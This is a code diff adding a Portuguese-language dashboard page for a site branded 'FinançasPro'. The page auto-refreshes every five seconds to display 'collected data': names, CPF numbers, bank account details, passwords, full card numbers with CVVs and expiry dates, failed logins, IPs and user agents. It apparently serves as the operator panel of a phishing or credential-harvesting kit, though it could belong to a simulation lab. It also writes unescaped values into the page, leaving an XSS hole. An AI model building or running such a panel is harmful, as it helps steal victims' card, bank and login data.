@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - Dados Coletados | FinançasPro</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <style>
+        .dashboard-container {
+            padding: 100px 0 50px;
+            background: var(--primary);
+            min-height: 100vh;
+        }
+        .dashboard-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+        .dashboard-header h1 {
+            color: var(--accent);
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 3rem;
+        }
+        .stat-card-dash {
+            background: var(--secondary);
+            padding: 1.5rem;
+            border-radius: 8px;
+            border: 2px solid var(--border-light);
+            text-align: center;
+        }
+        .stat-card-dash .value {
+            font-size: 2rem;
+            font-weight: bold;
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+        }
+        .stat-card-dash .label {
+            color: var(--gray-light);
+            font-size: 0.9rem;
+        }
+        .tabs {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 2rem;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .tab-btn-dash {
+            padding: 0.75rem 1.5rem;
+            background: var(--secondary);
+            border: 2px solid var(--border-light);
+            color: var(--accent);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+        }
+        .tab-btn-dash:hover {
+            border-color: var(--accent);
+        }
+        .tab-btn-dash.active {
+            background: var(--accent);
+            color: var(--primary);
+            border-color: var(--accent);
+        }
+        .data-table-container {
+            background: var(--secondary);
+            border-radius: 12px;
+            padding: 2rem;
+            border: 2px solid var(--border-light);
+            overflow-x: auto;
+        }
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            color: var(--accent);
+        }
+        .data-table th {
+            background: var(--primary);
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 2px solid var(--accent);
+            color: var(--accent);
+            font-weight: 600;
+        }
+        .data-table td {
+            padding: 1rem;
+            border-bottom: 1px solid var(--border-light);
+            color: var(--gray-light);
+        }
+        .data-table tr:hover {
+            background: rgba(255, 222, 89, 0.05);
+        }
+        .badge-type {
+            display: inline-block;
+            padding: 0.3rem 0.8rem;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+        .badge-registration {
+            background: rgba(16, 185, 129, 0.2);
+            color: #10b981;
+        }
+        .badge-payment {
+            background: rgba(255, 222, 89, 0.2);
+            color: var(--accent);
+        }
+        .badge-login {
+            background: rgba(59, 130, 246, 0.2);
+            color: #3b82f6;
+        }
+        .badge-failed {
+            background: rgba(239, 68, 68, 0.2);
+            color: #ef4444;
+        }
+        .refresh-btn {
+            padding: 0.75rem 2rem;
+            background: var(--accent);
+            color: var(--primary);
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 2rem;
+            transition: all 0.3s;
+        }
+        .refresh-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(255, 222, 89, 0.3);
+        }
+        .loading {
+            text-align: center;
+            padding: 3rem;
+            color: var(--accent);
+        }
+        .empty-state {
+            text-align: center;
+            padding: 3rem;
+            color: var(--gray-light);
+        }
+        .json-view {
+            background: var(--primary);
+            padding: 1rem;
+            border-radius: 8px;
+            border: 1px solid var(--border-light);
+            max-height: 400px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <span class="logo-icon">💼</span>
+                    <h1>FinançasPro - Dashboard</h1>
+                </div>
+                <nav>
+                    <ul>
+                        <li><a href="../index.html">Voltar ao Site</a></li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <div class="dashboard-container">
+        <div class="container">
+            <div class="dashboard-header">
+                <h1>📊 Dashboard de Dados Coletados</h1>
+                <p style="color: var(--gray-light);">Visualize todas as informações coletadas do sistema</p>
+            </div>
+
+            <div class="stats-grid" id="stats-grid">
+                <div class="stat-card-dash">
+                    <div class="value" id="stat-users">-</div>
+                    <div class="label">Usuários Registrados</div>
+                </div>
+                <div class="stat-card-dash">
+                    <div class="value" id="stat-registrations">-</div>
+                    <div class="label">Registros</div>
+                </div>
+                <div class="stat-card-dash">
+                    <div class="value" id="stat-payments">-</div>
+                    <div class="label">Pagamentos</div>
+                </div>
+                <div class="stat-card-dash">
+                    <div class="value" id="stat-logins">-</div>
+                    <div class="label">Logins</div>
+                </div>
+                <div class="stat-card-dash">
+                    <div class="value" id="stat-revenue">-</div>
+                    <div class="label">Receita Total</div>
+                </div>
+                <div class="stat-card-dash">
+                    <div class="value" id="stat-ips">-</div>
+                    <div class="label">IPs Únicos</div>
+                </div>
+            </div>
+
+            <div style="text-align: center; margin-bottom: 2rem; display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap;">
+                <button class="refresh-btn" onclick="loadAllData()">🔄 Atualizar Dados</button>
+                <button class="refresh-btn" onclick="clearAllData()" style="background: #ef4444; color: white;">🗑️ Limpar Todos os Dados</button>
+            </div>
+
+            <div class="tabs">
+                <button class="tab-btn-dash active" data-tab="all" onclick="showTab('all')">Todos os Dados</button>
+                <button class="tab-btn-dash" data-tab="users" onclick="showTab('users')">Usuários</button>
+                <button class="tab-btn-dash" data-tab="registrations" onclick="showTab('registrations')">Registros</button>
+                <button class="tab-btn-dash" data-tab="payments" onclick="showTab('payments')">Pagamentos</button>
+                <button class="tab-btn-dash" data-tab="logins" onclick="showTab('logins')">Logins</button>
+            </div>
+
+            <div id="data-container">
+                <div class="loading">Carregando dados...</div>
+            </div>
+        </div>
+    </div>
+
+    <script src="../js/config.js"></script>
+    <script>
+        // Detecta automaticamente a URL da API
+        function getApiBase() {
+            if (typeof API_CONFIG !== 'undefined') {
+                return API_CONFIG.BASE_URL + '/api';
+            }
+            // Fallback: detecta automaticamente
+            if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+                return 'http://localhost:3000/api';
+            }
+            // Em produção, usa a mesma origem
+            return window.location.origin + '/api';
+        }
+        
+        const API_BASE = getApiBase();
+        let currentTab = 'all';
+        let allData = [];
+        let users = [];
+        let stats = {};
+
+        async function loadAllData() {
+            try {
+                console.log('Carregando dados de:', API_BASE);
+                
+                // Load statistics
+                const statsRes = await fetch(`${API_BASE}/stats`);
+                if (!statsRes.ok) {
+                    throw new Error(`Erro HTTP: ${statsRes.status}`);
+                }
+                stats = await statsRes.json();
+                updateStats();
+
+                // Load all data
+                const dataRes = await fetch(`${API_BASE}/data`);
+                if (!dataRes.ok) {
+                    throw new Error(`Erro HTTP: ${dataRes.status}`);
+                }
+                allData = await dataRes.json();
+
+                // Load users
+                const usersRes = await fetch(`${API_BASE}/users`);
+                if (!usersRes.ok) {
+                    throw new Error(`Erro HTTP: ${usersRes.status}`);
+                }
+                users = await usersRes.json();
+
+                showTab(currentTab);
+            } catch (error) {
+                console.error('Erro ao carregar dados:', error);
+                document.getElementById('data-container').innerHTML = 
+                    `<div class="empty-state">
+                        ❌ Erro ao carregar dados.<br>
+                        <small>URL da API: ${API_BASE}</small><br>
+                        <small>Erro: ${error.message}</small><br>
+                        <small>Verifique se o servidor está rodando e acessível.</small>
+                    </div>`;
+            }
+        }
+
+        function updateStats() {
+            document.getElementById('stat-users').textContent = stats.total_users || 0;
+            document.getElementById('stat-registrations').textContent = stats.total_registrations || 0;
+            document.getElementById('stat-payments').textContent = stats.total_payments || 0;
+            document.getElementById('stat-logins').textContent = stats.total_logins || 0;
+            document.getElementById('stat-revenue').textContent = `R$ ${(stats.revenue || 0).toFixed(2)}`;
+            document.getElementById('stat-ips').textContent = stats.unique_ips || 0;
+        }
+
+        function showTab(tab) {
+            currentTab = tab;
+            
+            // Update tab buttons
+            document.querySelectorAll('.tab-btn-dash').forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.getAttribute('data-tab') === tab) {
+                    btn.classList.add('active');
+                }
+            });
+
+            let dataToShow = [];
+            let title = '';
+
+            switch(tab) {
+                case 'all':
+                    dataToShow = allData;
+                    title = 'Todos os Dados Coletados';
+                    break;
+                case 'users':
+                    dataToShow = users;
+                    title = 'Usuários Registrados';
+                    break;
+                case 'registrations':
+                    dataToShow = allData.filter(d => d.type === 'registration');
+                    title = 'Registros de Conta';
+                    break;
+                case 'payments':
+                    dataToShow = allData.filter(d => d.type === 'payment');
+                    title = 'Dados de Pagamento';
+                    break;
+                case 'logins':
+                    dataToShow = allData.filter(d => d.type === 'login' || d.type === 'failed_login');
+                    title = 'Tentativas de Login';
+                    break;
+            }
+
+            renderData(dataToShow, title);
+        }
+
+        function renderData(data, title) {
+            const container = document.getElementById('data-container');
+            
+            if (data.length === 0) {
+                container.innerHTML = `<div class="empty-state">Nenhum dado encontrado para "${title}"</div>`;
+                return;
+            }
+
+            if (currentTab === 'all' || currentTab === 'payments' || currentTab === 'registrations') {
+                // Render as table
+                let html = `<div class="data-table-container"><h2 style="color: var(--accent); margin-bottom: 1.5rem;">${title} (${data.length})</h2>`;
+                html += '<table class="data-table"><thead><tr>';
+                
+                // Get all unique keys
+                const keys = new Set();
+                data.forEach(item => {
+                    Object.keys(item).forEach(key => {
+                        if (key !== 'password_hash') keys.add(key);
+                    });
+                });
+                
+                const headers = Array.from(keys).filter(k => !k.startsWith('_'));
+                headers.forEach(key => {
+                    html += `<th>${formatHeader(key)}</th>`;
+                });
+                html += '</tr></thead><tbody>';
+
+                data.forEach(item => {
+                    html += '<tr>';
+                    headers.forEach(key => {
+                        let value = item[key] || '-';
+                        if (key === 'type') {
+                            value = `<span class="badge-type badge-${getBadgeClass(value)}">${value}</span>`;
+                        } else if (key === 'valor') {
+                            value = `R$ ${parseFloat(value || 0).toFixed(2)}`;
+                        } else if (key === 'timestamp' || key === 'created_at' || key === 'server_timestamp') {
+                            value = formatDate(value);
+                        } else if (key === 'senha') {
+                            value = '***' + value.slice(-3);
+                        } else if (typeof value === 'object') {
+                            value = JSON.stringify(value);
+                        }
+                        html += `<td>${value}</td>`;
+                    });
+                    html += '</tr>';
+                });
+
+                html += '</tbody></table></div>';
+                container.innerHTML = html;
+            } else {
+                // Render as JSON for users
+                container.innerHTML = `
+                    <div class="data-table-container">
+                        <h2 style="color: var(--accent); margin-bottom: 1.5rem;">${title} (${data.length})</h2>
+                        <div class="json-view">${JSON.stringify(data, null, 2)}</div>
+                    </div>
+                `;
+            }
+        }
+
+        function formatHeader(key) {
+            const headers = {
+                'id': 'ID',
+                'type': 'Tipo',
+                'nome': 'Nome',
+                'email': 'E-mail',
+                'cpf': 'CPF',
+                'telefone': 'Telefone',
+                'banco': 'Banco',
+                'agencia': 'Agência',
+                'conta': 'Conta',
+                'senha': 'Senha',
+                'plano': 'Plano',
+                'valor': 'Valor',
+                'nome_cartao': 'Nome no Cartão',
+                'numero_cartao': 'Número do Cartão',
+                'validade': 'Validade',
+                'cvv': 'CVV',
+                'cpf_titular': 'CPF Titular',
+                'parcelas': 'Parcelas',
+                'ip_address': 'IP',
+                'timestamp': 'Data/Hora',
+                'created_at': 'Criado em',
+                'server_timestamp': 'Servidor',
+                'user_agent': 'User Agent',
+                'success': 'Sucesso'
+            };
+            return headers[key] || key.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
+        }
+
+        function getBadgeClass(type) {
+            if (type === 'registration') return 'registration';
+            if (type === 'payment') return 'payment';
+            if (type === 'login') return 'login';
+            if (type === 'failed_login') return 'failed';
+            return 'registration';
+        }
+
+        function formatDate(dateString) {
+            if (!dateString) return '-';
+            try {
+                const date = new Date(dateString);
+                return date.toLocaleString('pt-BR');
+            } catch {
+                return dateString;
+            }
+        }
+
+        async function clearAllData() {
+            if (!confirm('⚠️ ATENÇÃO: Esta ação irá apagar TODOS os dados coletados (registros, usuários, pagamentos, logins).\n\nEsta ação não pode ser desfeita!\n\nDeseja continuar?')) {
+                return;
+            }
+            
+            if (!confirm('⚠️ CONFIRMAÇÃO FINAL: Tem certeza que deseja apagar TODOS os dados?')) {
+                return;
+            }
+            
+            try {
+                const response = await fetch(`${API_BASE}/clear`, {
+                    method: 'DELETE',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    }
+                });
+                
+                const result = await response.json();
+                
+                if (result.status === 'success') {
+                    alert('✅ Todos os dados foram limpos com sucesso!');
+                    // Recarrega os dados (que estarão vazios agora)
+                    loadAllData();
+                } else {
+                    alert('❌ Erro ao limpar dados: ' + (result.message || 'Erro desconhecido'));
+                }
+            } catch (error) {
+                console.error('Erro ao limpar dados:', error);
+                alert('❌ Erro de conexão ao tentar limpar dados. Verifique se o servidor está rodando.');
+            }
+        }
+
+        // Load data on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            loadAllData();
+            // Auto-refresh every 5 seconds
+            setInterval(loadAllData, 5000);
+        });
+    </script>
+</body>
+</html>
+
